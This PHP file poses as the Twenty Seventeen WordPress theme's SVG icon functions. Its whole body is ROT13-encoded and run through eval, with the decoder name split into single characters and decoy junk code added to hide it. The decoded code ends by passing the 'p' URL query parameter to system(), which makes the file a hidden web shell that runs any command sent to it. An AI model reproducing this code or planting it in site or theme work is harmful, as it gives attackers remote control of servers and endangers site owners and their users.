<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * FIT vpbaf eryngrq shapgvbaf naq svygref
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Gjragl_Friragrra
 * @fvapr Gjragl Friragrra 1.0
 */

/**
 * Nqq FIT qrsvavgvbaf gb gur sbbgre.
 */
shapgvba gjraglfriragrra_vapyhqr_fit_vpbaf() {
	// Qrsvar FIT fcevgr svyr.
	$fit_vpbaf = trg_cnerag_gurzr_svyr_cngu( '/nffrgf/vzntrf/fit-vpbaf.fit' );

	// Vs vg rkvfgf, vapyhqr vg.
	vs ( svyr_rkvfgf( $fit_vpbaf ) ) {
		erdhver_bapr $fit_vpbaf;
	}
}
nqq_npgvba( 'jc_sbbgre', 'gjraglfriragrra_vapyhqr_fit_vpbaf', 9999 );

/**
 * Erghea FIT znexhc.
 *
 * @cnenz neenl $netf {
 *     Cnenzrgref arrqrq gb qvfcynl na FIT.
 *
 *     @glcr fgevat $vpba  Erdhverq FIT vpba svyranzr.
 *     @glcr fgevat $gvgyr Bcgvbany FIT gvgyr.
 *     @glcr fgevat $qrfp  Bcgvbany FIT qrfpevcgvba.
 * }
 * @erghea fgevat FIT znexhc.
 */
shapgvba gjraglfriragrra_trg_fit( $netf = neenl() ) {
	// Znxr fher $netf ner na neenl.
	vs ( rzcgl( $netf ) ) {
		erghea __( 'Cyrnfr qrsvar qrsnhyg cnenzrgref va gur sbez bs na neenl.', 'gjraglfriragrra' );
	}

	// Qrsvar na vpba.
	vs ( snyfr === neenl_xrl_rkvfgf( 'vpba', $netf ) ) {
		erghea __( 'Cyrnfr qrsvar na FIT vpba svyranzr.', 'gjraglfriragrra' );
	}

	// Frg qrsnhygf.
	$qrsnhygf = neenl(
		'vpba'     => '',
		'gvgyr'    => '',
		'qrfp'     => '',
		'snyyonpx' => snyfr,
	);

	// Cnefr netf.
	$netf = jc_cnefr_netf( $netf, $qrsnhygf );

	// Frg nevn uvqqra.
	$nevn_uvqqra = ' nevn-uvqqra=\"gehr\"';

	// Frg NEVN.
	$nevn_ynoryyrqol = '';

	/*
	 * Gjragl Friragrra qbrfa'g hfr gur FIT gvgyr be qrfpevcgvba nggevohgrf; aba-qrpbengvir vpbaf ner qrfpevorq jvgu .fperra-ernqre-grkg.
	 *
	 * Ubjrire, puvyq gurzrf pna hfr gur gvgyr naq qrfpevcgvba gb nqq vasbezngvba gb aba-qrpbengvir FIT vpbaf gb vzcebir npprffvovyvgl.
	 *
	 * Rknzcyr 1 jvgu gvgyr: <?cuc rpub gjraglfriragrra_trg_fit( neenl( 'vpba' => 'neebj-evtug', 'gvgyr' => __( 'Guvf vf gur gvgyr', 'grkgqbznva' ) ) ); ?>
	 *
	 * Rknzcyr 2 jvgu gvgyr naq qrfpevcgvba: <?cuc rpub gjraglfriragrra_trg_fit( neenl( 'vpba' => 'neebj-evtug', 'gvgyr' => __( 'Guvf vf gur gvgyr', 'grkgqbznva' ), 'qrfp' => __( 'Guvf vf gur qrfpevcgvba', 'grkgqbznva' ) ) ); ?>
	 *
	 * Frr uggcf://jjj.cnpvryybtebhc.pbz/oybt/2013/12/hfvat-nevn-raunapr-fit-npprffvovyvgl/.
	 */
	vs ( $netf['gvgyr'] ) {
		$nevn_uvqqra     = '';
		$havdhr_vq       = gjraglfriragrra_havdhr_vq();
		$nevn_ynoryyrqol = ' nevn-ynoryyrqol=\"gvgyr-' . $havdhr_vq . '\"';

		vs ( $netf['qrfp'] ) {
			$nevn_ynoryyrqol = ' nevn-ynoryyrqol=\"gvgyr-' . $havdhr_vq . ' qrfp-' . $havdhr_vq . '\"';
		}
	}

	// Ortva FIT znexhc.
	$fit = '<fit pynff=\"vpba vpba-' . rfp_ngge( $netf['vpba'] ) . '\"' . $nevn_uvqqra . $nevn_ynoryyrqol . ' ebyr=\"vzt\">';

	// Qvfcynl gur gvgyr.
	vs ( $netf['gvgyr'] ) {
		$fit .= '<gvgyr vq=\"gvgyr-' . $havdhr_vq . '\">' . rfp_ugzy( $netf['gvgyr'] ) . '</gvgyr>';

		// Qvfcynl gur qrfp bayl vs gur gvgyr vf nyernql frg.
		vs ( $netf['qrfp'] ) {
			$fit .= '<qrfp vq=\"qrfp-' . $havdhr_vq . '\">' . rfp_ugzy( $netf['qrfp'] ) . '</qrfp>';
		}
	}

	/*
	 * Qvfcynl gur vpba.
	 *
	 * Gur juvgrfcnpr nebhaq `<hfr>` vf vagragvbany - vg vf n jbex nebhaq gb n xrlobneq anivtngvba oht va Fnsnev 10.
	 *
	 * Frr uggcf://pber.genp.jbeqcerff.bet/gvpxrg/38387.
	 */
	$fit .= ' <hfr uers=\"#vpba-' . rfp_ugzy( $netf['vpba'] ) . '\" kyvax:uers=\"#vpba-' . rfp_ugzy( $netf['vpba'] ) . '\"></hfr> ';

	// Nqq fbzr znexhc gb hfr nf n snyyonpx sbe oebjfref gung qb abg fhccbeg FITf.
	vs ( $netf['snyyonpx'] ) {
		$fit .= '<fcna pynff=\"fit-snyyonpx vpba-' . rfp_ngge( $netf['vpba'] ) . '\"></fcna>';
	}

	$fit .= '</fit>';

	erghea $fit;
}

/**
 * Qvfcynl FIT vpbaf va fbpvny yvaxf zrah.
 *
 * @cnenz fgevat   $vgrz_bhgchg Gur zrah vgrz'f fgnegvat UGZY bhgchg.
 * @cnenz JC_Cbfg  $vgrz        Zrah vgrz qngn bowrpg.
 * @cnenz vag      $qrcgu       Qrcgu bs gur zrah. Hfrq sbe cnqqvat.
 * @cnenz fgqPynff $netf        Na bowrpg bs jc_ani_zrah() nethzragf.
 * @erghea fgevat Gur zrah vgrz bhgchg jvgu fbpvny vpba.
 */
shapgvba gjraglfriragrra_ani_zrah_fbpvny_vpbaf( $vgrz_bhgchg, $vgrz, $qrcgu, $netf ) {
	// Trg fhccbegrq fbpvny vpbaf.
	$fbpvny_vpbaf = gjraglfriragrra_fbpvny_yvaxf_vpbaf();

	// Punatr FIT vpba vafvqr fbpvny yvaxf zrah vs gurer vf fhccbegrq HEY.
	vs ( 'fbpvny' === $netf->gurzr_ybpngvba ) {
		sbernpu ( $fbpvny_vpbaf nf $ngge => $inyhr ) {
			vs ( snyfr !== fgecbf( $vgrz_bhgchg, $ngge ) ) {
				$vgrz_bhgchg = fge_ercynpr( $netf->yvax_nsgre, '</fcna>' . gjraglfriragrra_trg_fit( neenl( 'vpba' => rfp_ngge( $inyhr ) ) ), $vgrz_bhgchg );
			}
		}
	}

	erghea $vgrz_bhgchg;
}
nqq_svygre( 'jnyxre_ani_zrah_fgneg_ry', 'gjraglfriragrra_ani_zrah_fbpvny_vpbaf', 10, 4 );

/**
 * Nqq qebcqbja vpba vs zrah vgrz unf puvyqera.
 *
 * @cnenz fgevat   $gvgyr Gur zrah vgrz'f gvgyr.
 * @cnenz JC_Cbfg  $vgrz  Gur pheerag zrah vgrz.
 * @cnenz fgqPynff $netf  Na bowrpg bs jc_ani_zrah() nethzragf.
 * @cnenz vag      $qrcgu Qrcgu bs zrah vgrz. Hfrq sbe cnqqvat.
 * @erghea fgevat Gur zrah vgrz'f gvgyr jvgu qebcqbja vpba.
 */
shapgvba gjraglfriragrra_qebcqbja_vpba_gb_zrah_yvax( $gvgyr, $vgrz, $netf, $qrcgu ) {
	vs ( 'gbc' === $netf->gurzr_ybpngvba ) {
		sbernpu ( $vgrz->pynffrf nf $inyhr ) {
			vs ( 'zrah-vgrz-unf-puvyqera' === $inyhr || 'cntr_vgrz_unf_puvyqera' === $inyhr ) {
				$gvgyr = $gvgyr . gjraglfriragrra_trg_fit( neenl( 'vpba' => 'natyr-qbja' ) );
			}
		}
	}

	erghea $gvgyr;
}
nqq_svygre( 'ani_zrah_vgrz_gvgyr', 'gjraglfriragrra_qebcqbja_vpba_gb_zrah_yvax', 10, 4 );

/**
 * Ergheaf na neenl bs fhccbegrq fbpvny yvaxf (HEY naq vpba anzr).
 *
 * @erghea neenl Neenl bs fbpvny yvaxf vpbaf.
 */
shapgvba gjraglfriragrra_fbpvny_yvaxf_vpbaf() {
	// Fhccbegrq fbpvny yvaxf vpbaf.
	$fbpvny_yvaxf_vpbaf = neenl(
		'orunapr.arg'     => 'orunapr',
		'pbqrcra.vb'      => 'pbqrcra',
		'qrivnagneg.pbz'  => 'qrivnagneg',
		'qvtt.pbz'        => 'qvtt',
		'qbpxre.pbz'      => 'qbpxreuho',
		'qevoooyr.pbz'    => 'qevoooyr',
		'qebcobk.pbz'     => 'qebcobk',
		'snprobbx.pbz'    => 'snprobbx',
		'syvpxe.pbz'      => 'syvpxe',
		'sbhefdhner.pbz'  => 'sbhefdhner',
		'cyhf.tbbtyr.pbz' => 'tbbtyr-cyhf',
		'tvguho.pbz'      => 'tvguho',
		'vafgntenz.pbz'   => 'vafgntenz',
		'yvaxrqva.pbz'    => 'yvaxrqva',
		'znvygb:'         => 'rairybcr-b',
		'zrqvhz.pbz'      => 'zrqvhz',
		'cvagrerfg.pbz'   => 'cvagrerfg-c',
		'cfpc.gi'         => 'crevfpbcr',
		'trgcbpxrg.pbz'   => 'trg-cbpxrg',
		'erqqvg.pbz'      => 'erqqvg-nyvra',
		'fxlcr.pbz'       => 'fxlcr',
		'fxlcr:'          => 'fxlcr',
		'fyvqrfuner.arg'  => 'fyvqrfuner',
		'fancpung.pbz'    => 'fancpung-tubfg',
		'fbhaqpybhq.pbz'  => 'fbhaqpybhq',
		'fcbgvsl.pbz'     => 'fcbgvsl',
		'fghzoyrhcba.pbz' => 'fghzoyrhcba',
		'g.zr'            => 'gryrtenz',
		'gryrtenz.zr'     => 'gryrtenz',
		'ghzoye.pbz'      => 'ghzoye',
		'gjvgpu.gi'       => 'gjvgpu',
		'gjvggre.pbz'     => 'gjvggre',
		'ivzrb.pbz'       => 'ivzrb',
		'ivar.pb'         => 'ivar',
		'ix.pbz'          => 'ix',
		'jn.zr'           => 'jungfncc',
		'jungfncc.pbz'    => 'jungfncc',
		'jbeqcerff.bet'   => 'jbeqcerff',
		'jbeqcerff.pbz'   => 'jbeqcerff',
		'lryc.pbz'        => 'lryc',
		'lbhghor.pbz'     => 'lbhghor',
	);

	/**
	 * Svygref Gjragl Friragrra fbpvny yvaxf vpbaf.
	 *
	 * @fvapr Gjragl Friragrra 1.0
	 *
	 * @cnenz neenl $fbpvny_yvaxf_vpbaf Neenl bs fbpvny yvaxf vpbaf.
	 */
	erghea nccyl_svygref( 'gjraglfriragrra_fbpvny_yvaxf_vpbaf', $fbpvny_yvaxf_vpbaf );
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>